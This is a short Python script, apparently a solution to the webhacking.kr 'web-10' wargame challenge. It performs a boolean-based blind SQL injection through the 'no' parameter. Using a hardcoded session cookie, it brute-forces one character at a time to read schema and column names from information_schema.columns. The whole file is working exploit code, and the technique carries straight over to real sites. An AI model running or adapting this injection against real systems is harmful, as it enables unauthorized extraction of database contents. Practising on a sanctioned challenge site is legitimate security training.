import requests
cookies={'PHPSESSID':'1ki8ju9v1rd2gatukqsv05gskv'}
key='<td>1</td>'
for i in range(21): 
    for j in range(20,128):   
        url='https://webhacking.kr/challenge/web-10/?no='
        url=url+f'if((ord(substr((select(min(concat(table_schema,column_name)))from(information_schema.columns)),{i},1)))in({j}),1,11)'
        response=requests.get(url=url,cookies=cookies)
        response_text=response.text
        if response_text.find(key) != -1:
            print(chr(j),end="")
            break
print("\n")